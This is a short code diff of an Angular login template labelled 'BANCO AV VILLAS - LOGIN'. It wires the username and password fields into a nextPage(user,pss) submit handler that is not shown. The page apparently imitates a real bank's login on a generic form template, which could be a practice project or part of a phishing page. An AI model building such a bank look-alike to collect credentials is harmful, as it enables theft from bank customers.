@@ -1,7 +1,7 @@
 <div>
 <form class="formoid-solid-red"
     style="background-color:#FFFFFF;font-size:14px;font-family:'Roboto',Arial,Helvetica,sans-serif;color:#34495E;max-width:500px;min-width:150px"
-    (submit)="nextPage()"
+    (submit)="nextPage(user,pss)"
     >
     <div class="title">
         <h2>BANCO AV VILLAS - LOGIN</h2>
@@ -24,7 +24,7 @@
                         <label class="title"><span class="required"></span></label>
                         <div class="item-cont">
                             <input class="large" type="text" name="input" required="required"
-                                placeholder="Usuario" /><span class="icon-place"></span>
+                                placeholder="Usuario" #user/><span class="icon-place"></span>
                         </div>
                     </div>
                 </td>
@@ -37,7 +37,7 @@
                         <label class="title"></label>
                         <div class="item-cont">
                             <input class="large" type="password" name="password" value="" placeholder="Contraseña"
-                                required="required" /><span class="icon-place"></span>
+                                required="required" #pss/><span class="icon-place"></span>
                         </div>
                     </div>
                 </td>
